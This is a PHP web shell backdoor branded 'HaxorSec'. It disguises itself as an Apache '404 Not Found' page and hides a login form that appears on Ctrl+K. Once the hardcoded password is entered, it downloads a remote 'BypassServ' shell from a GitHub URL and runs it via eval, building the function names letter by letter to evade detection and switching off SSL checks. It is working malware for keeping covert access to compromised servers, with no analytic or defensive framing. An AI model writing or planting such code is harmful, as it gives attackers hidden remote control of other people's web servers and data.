HaxorSec
<?php
function check_password($input_password) {
    $stored_password = '123qweasd'; // Ganti dengan password yang Anda inginkan
    return $input_password === $stored_password;
}

function geturlsinfo($url) {
    $fpn = "f"."o"."p"."e"."n";
    $strim = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
    $fgt = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
    $cexec = "c"."u"."r"."l"."_"."e"."x"."e"."c";

    if (function_exists($cexec)) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        $urls = $cexec($conn);
        curl_close($conn);
    } elseif (function_exists($fgt)) {
        $urls = $fgt($url);
    } elseif (function_exists($fpn) && function_exists($strim)) {
        $handle = $fpn($url, "r");
        $urls = $strim($handle);
        fclose($handle);
    } else {
        $urls = false;
    }
    return $urls;
}

// Proses login
if (isset($_POST['password']) && check_password($_POST['password'])) {
    $a = geturlsinfo('https://raw.githubusercontent.com/HaxorSecInfec/BypassServ-Mini-Shell/main/bypasserv-new.php');
    eval('?>' . $a);
    exit;
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <style>
        #password-form {
            opacity: 0;
            position: absolute;
            top: -9999px;
            left: -9999px;
        }
    </style>
</head>
<body>
    <h1>404 Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address>Apache/2.4.41 (Ubuntu) Server at localhost Port 80</address>

    <form id="password-form" method="POST">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>

    <script>
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'k') {
                const form = document.getElementById('password-form');
                form.style.opacity = '1';
                form.style.position = 'static';
                form.style.top = 'auto';
                form.style.left = 'auto';
                form.focus();
            }
        });
    </script>
</body>
</html>
